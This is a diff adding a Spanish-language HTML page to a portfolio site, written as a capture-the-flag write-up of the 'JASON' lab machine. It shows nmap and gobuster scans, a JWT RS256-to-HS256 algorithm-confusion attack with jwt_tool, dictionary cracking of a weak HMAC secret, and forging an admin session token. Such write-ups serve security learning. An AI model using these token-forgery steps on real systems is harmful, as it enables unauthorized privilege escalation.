@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Library</title>
+    <link href="../style/estilo.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeup.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Máquina: JASON</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el <!-- TODO: fecha --> | Categoría: WEB / JWT </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Este reto consiste en comprometer una aplicación web/API que utiliza JSON Web Tokens (JWT)
+            para el control de autenticación y roles. El objetivo es escalar privilegios desde un usuario
+            sin permisos hasta un rol de administrador, explotando debilidades en la implementación de
+            verificación de firma de los tokens.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            Se comenzó con un escaneo de puertos completo:
+        </p>
+        <pre><code class="language-bash">
+sudo nmap -p- -open -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
+        </code></pre>
+
+        <img src="../Assets/jason/1-nmap.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="resultado nmap">
+
+        <p class="text-gray-300 mt-4">
+            Se detectó un servicio web en el puerto 5000. Se hizo descubrimiento de directorios:
+        </p>
+
+        <pre><code class="language-bash">
+gobuster dir -u http://172.17.0.2:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
+        </code></pre>
+        <img src="../Assets/jason/2.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="gobuster inicial">
+
+        <p class="text-gray-300 mt-4">
+            Se amplió la búsqueda apuntando a extensiones típicas de configuración y claves,
+            lo que llevó al hallazgo de archivos sensibles:
+        </p>
+
+        <pre><code class="language-bash">
+gobuster dir -u http://172.17.0.2:5000 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x json,pem,key,txt
+        </code></pre>
+        <img src="../Assets/jason/3.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="gobuster extensiones json/pem/key">
+    </section>
+
+    <!-- Explotación -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Explotación</h2>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">1) Recuperación de la clave pública</h3>
+        <p class="text-gray-300 mb-4">
+            Entre los archivos descubiertos apareció una clave pública en base64. Se decodificó:
+        </p>
+        <img src="../Assets/jason/4.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="clave pública">
+        <pre><code class="language-bash">
+echo 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K...' | base64 -d > public.pem
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Verificación de la clave (RSA 2048 bits):
+        </p>
+        <pre><code class="language-bash">
+openssl rsa -pubin -in public.pem -text -noout
+
+Public-Key: (2048 bit)
+Modulus:
+    00:b7:64:2c:25:3b:54:d1:98:cb:31:1b:92:05:51:
+    34:57:b6:79:6d:90:04:61:09:e0:d7:78:d9:f0:ea:
+    fe:6f:09:03:f3:5a:f9:19:6e:aa:ff:a0:82:ef:7c:
+    97:8c:b7:13:6c:0e:9a:78:6e:2c:0a:8f:9d:40:5e:
+    39:7b:b0:b8:29:21:58:0c:48:0f:ca:f6:f2:3c:25:
+    5d:bd:9b:05:ca:78:d2:44:88:86:b2:94:52:5b:3c:
+    90:a6:7a:1e:de:fc:02:f0:5c:b7:5f:f3:76:0b:c5:
+    ec:70:d1:fe:1c:d7:38:d3:c9:31:ac:3a:89:15:05:
+    20:03:ae:dd:75:d7:7b:20:e6:9b:17:1d:ba:db:90:
+    aa:6b:04:ea:16:af:d4:1e:26:d5:1b:1e:15:79:36:
+    42:1e:11:c9:91:53:96:c1:c5:fe:12:96:53:75:57:
+    b7:ca:fb:c9:e9:2e:da:33:35:5f:82:16:27:b3:80:
+    f7:99:ce:6b:2e:d4:af:80:2f:5d:a0:cb:b8:ee:91:
+    f5:d9:e3:18:23:90:f2:7b:58:ea:43:25:c9:2d:03:
+    85:f3:e8:8b:f1:65:60:41:2c:b1:6b:93:11:31:b5:
+    3e:25:df:33:2b:58:df:e7:1c:c3:43:24:fa:2b:07:
+    ec:39:b4:0a:7f:78:a2:c6:a7:57:0e:37:e0:60:31:
+    7a:0f
+Exponent: 65537 (0x10001)
+        </code></pre>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">2) Confusión de algoritmo RS256 → HS256</h3>
+        <p class="text-gray-300 mb-4">
+            Se contaba con un JWT válido de un usuario ya con <code>role: admin</code>, pero próximo a
+            expirar. Decodificando el payload:
+        </p>
+
+        <img src="../Assets/jason/6.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="decodificación clave pública">
+        <p class="text-gray-300 mb-4">
+            Si el backend verifica tokens RS256 usando la clave pública, pero el código de verificación
+            no distingue el algoritmo declarado en el header, es posible firmar un token nuevo con
+            HS256 usando esa misma clave pública como si fuera un secreto HMAC. El servidor, al
+            verificar, usa la clave pública otra vez y la firma coincide: esto es el clásico ataque de
+            <strong>confusión de algoritmo JWT (RS256→HS256)</strong>.
+        </p>
+        <pre><code class="language-bash">
+python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InNhbnRpIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzgzMjIzMTkyfQ.cXx5iwrgkaWy8gKJGbpcG1iFZLotXg6USxfZRjwtoPk" -X k -pk public.pem
+        </code></pre>
+        <img src="../Assets/jason/7.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="ataque de confusión de algoritmo">
+
+        <p class="text-gray-300 mt-4">
+            El resultado fue un token válido re-firmado, usado para renovar la expiración
+            (<code>exp</code> extendido a <code>1783400157</code>), sin necesidad de conocer la
+            clave privada:
+        </p>
+
+        <img src="../Assets/jason/8.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="level 2">
+        <h3 class="text-xl font-semibold mb-2 mt-6">3) Cracking de secreto débil y escalada guest → admin</h3>
+        <p class="text-gray-300 mb-4">
+            Pasamos a la segunda parte del reto, donde se tenía un JWT de un usuario invitado (<code>role: guest</code>) 
+            y se quería escalar a administrador. Decodificando el payload:
+        </p>
+        <p class="text-gray-300 mb-4">
+            Se crackeo el secreto HMAC contra <code>rockyou.txt</code>:
+        </p>
+        <pre><code class="language-bash">
+python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdF91c2VyIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzgzMzk3MDg5LCJleHAiOjE3ODM0MDA2ODl9.xAS0b28MU2H78Davbw1VR46cn15ggg42rF52M3-rIQU -C -d /usr/share/wordlists/rockyou.txt
+        </code></pre>
+        <img src="../Assets/jason/9.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="cracking de secreto HMAC">
+
+        <p class="text-gray-300 mt-4">
+            El secreto se recuperó del wordlist. Con él se modificó el payload (<code>role: guest → admin</code>)
+            y se intentó re-firmar directamente con jwt_tool:
+        </p>
+        <pre><code class="language-bash">
+python3 jwt_tool.py \
+"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdF91c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgzMzk3MDg5LCJleHAiOjE3ODM0MDA2ODl9.VrEJkXT4frp5t2ET504tIMts74TrnOjKUnPuumUCpT0" \
+-S hs256 \
+-p "secret123"
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Esta re-firma vía jwt_tool no fue aceptada por el servidor (probablemente por una
+            diferencia de formato/espaciado en el JSON serializado por la herramienta, algo común
+            al comparar firmas HMAC byte a byte). Se repitió el proceso manualmente en
+            <a href="https://jwt.io" class="text-blue-400 hover:underline" target="_blank">jwt.io</a>,
+            construyendo el mismo payload con <code>role: admin</code> y firmando con el secreto
+            <code>secret123</code>:
+        </p>
+        <img src="../Assets/jason/11.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="token forjado en jwt.io">
+
+        <p class="text-gray-300 mt-4">
+            Reemplazando el valor de la cookie de sesión por este token forjado, el acceso como
+            administrador funcionó:
+        </p>
+        <img src="../Assets/jason/12.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="acceso admin con cookie forjada">
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            <!-- TODO: completar qué se obtuvo tras el acceso admin (flag, panel, RCE, etc.) -->
+            Se logró escalar privilegios de invitado a administrador combinando dos fallas de
+            implementación JWT: confusión de algoritmo RS256/HS256 usando la clave pública como
+            secreto, y un secreto HMAC débil crackeable por diccionario.
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
